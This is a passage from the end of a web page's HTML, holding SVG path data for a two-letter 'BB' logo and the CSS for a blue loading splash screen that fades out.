.99,41.51L6.99,30.27C6.99,30.1636,7.01095,30.0583,7.05166,29.96C7.09236,29.8618,7.15203,29.7725,7.22724,29.6972C7.30246,29.622,7.39175,29.5624,7.49003,29.5217C7.5883,29.481,7.69363,29.46,7.8,29.46L20.33,29.46C26.33,29.46,28.97,31.16,28.97,35.89C28.97,40.62,26.36,42.31,20.33,42.31Z" fill="#fff" transform="translate(17.9851,27.29) translate(-17.9851,-27.29)"/><path id="B-2" data-name="B" class="cls-1" d="M72.08,25.66C74.98,24.21,76.8,21.07,76.8,17.2C76.8,10.61,71.66,6.13,64.4,6.13L43.56,6.13C43.4545,6.1313,43.3502,6.15321,43.2531,6.1945C43.156,6.23579,43.0679,6.29566,42.9937,6.37075C42.9195,6.44584,42.8608,6.53469,42.8207,6.63232C42.7806,6.72995,42.76,6.83447,42.76,6.94L42.76,47.64C42.7587,47.7459,42.7784,47.851,42.818,47.9492C42.8576,48.0474,42.9163,48.1368,42.9907,48.2122C43.0652,48.2875,43.1538,48.3473,43.2515,48.3882C43.3492,48.429,43.4541,48.45,43.56,48.45L63.49,48.45C73.49,48.45,78.72,44.16,78.72,35.75C78.72,27.55,72.08,25.66,72.08,25.66ZM50.56,12.25L62.92,12.25C67.48,12.25,69.8,14.2,69.8,17.79C69.8,21.38,67.49,23.33,62.92,23.33L50.56,23.33C50.454,23.3287,50.3492,23.3069,50.2516,23.2657C50.1539,23.2246,50.0651,23.1648,49.9901,23.0899C49.9152,23.0149,49.8554,22.9261,49.8143,22.8284C49.7731,22.7308,49.7513,22.626,49.75,22.52L49.75,13.06C49.75,12.9536,49.771,12.8483,49.8117,12.75C49.8524,12.6518,49.912,12.5625,49.9872,12.4872C50.0625,12.412,50.1518,12.3524,50.25,12.3117C50.3483,12.271,50.4536,12.25,50.56,12.25ZM63.09,42.31L50.55,42.31C50.4449,42.31,50.3409,42.2893,50.2439,42.2491C50.1468,42.2089,50.0586,42.15,49.9843,42.0757C49.91,42.0014,49.8511,41.9132,49.8109,41.8161C49.7707,41.7191,49.75,41.6151,49.75,41.51L49.75,30.27C49.7487,30.1641,49.7684,30.059,49.808,29.9608C49.8476,29.8626,49.9063,29.7732,49.9807,29.6978C50.0552,29.6225,50.1438,29.5627,50.2415,29.5218C50.3392,29.481,50.4441,29.46,50.55,29.46L63.09,29.46C69.09,29.46,71.73,31.16,71.73,35.89C71.73,40.62,69.12,42.31,63.09,42.31Z" fill="#fff" transform="translate(60.74,27.29) translate(-60.74,-27.29)"/></g></g></svg></figure><style data-id="app-shell-style">body{margin:0;background-color:#134481}body,html{height:100%}figure{background-color:#134481;margin:auto;padding:0;width:100vw;height:100vh;position:fixed;top:0;left:0;right:0;bottom:0;z-index:1}.app-shell{will-change:transform}.app-shell.destroy{-webkit-animation:appShellProgressFadeIn;animation:appShellProgressFadeIn;-webkit-animation-duration:650ms;animation-duration:650ms;-webkit-animation-fill-mode:forwards;animation-fill-mode:forwards}@keyframes appShellProgressFadeIn{from{opacity:1}to{opacity:0}}</style> </div>




</body></html>